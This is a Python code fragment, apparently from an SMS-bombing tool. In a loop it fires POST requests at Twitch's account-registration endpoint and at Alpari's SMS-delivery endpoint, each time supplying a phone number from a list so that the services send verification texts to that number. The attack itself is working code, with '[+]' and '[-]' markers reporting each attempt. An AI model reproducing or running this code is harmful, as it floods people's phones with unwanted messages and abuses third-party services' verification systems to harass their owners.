...
while True:
        ...
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                ...
                                "password": password[index], "phone_number": _phone[index], "username": username[index]})
            print('[+]', _phone[index])
        except:
            print('[-]', _phone[index])
    ...
    for index in range(20):
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email[index]}@gmail.ru", "mobile_phone": _phone[index],
                                "deliveryOption": "sms"})
            print('[+]', _phone[index])
        except:
            print('[-]', _phone[index])
